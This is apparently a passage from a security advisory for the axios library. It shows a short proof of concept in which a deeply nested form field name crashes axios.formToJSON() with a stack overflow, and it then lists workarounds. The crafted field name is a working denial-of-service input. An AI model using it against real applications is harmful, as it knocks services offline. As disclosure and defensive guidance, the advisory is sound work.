fd.append('a' + '[x]'.repeat(15000), 'value');

try {
  axios.formToJSON(fd);
  console.log('not vulnerable');
} catch (e) {
  console.log(`${e.constructor.name}: ${e.message}`);
}
Expected result on affected versions:

RangeError: Maximum call stack size exceeded

The same condition can be reached via an axios request transformation when attacker-controlled FormData is sent with Content-Type: application/json.

Workarounds
Applications can reject or normalise untrusted form field names before calling axios.formToJSON().

Applications can avoid sending untrusted FormData through axios as JSON unless JSON conversion is required.

Applications should catch errors around formToJSON() or axios requests that transform untrusted FormData.

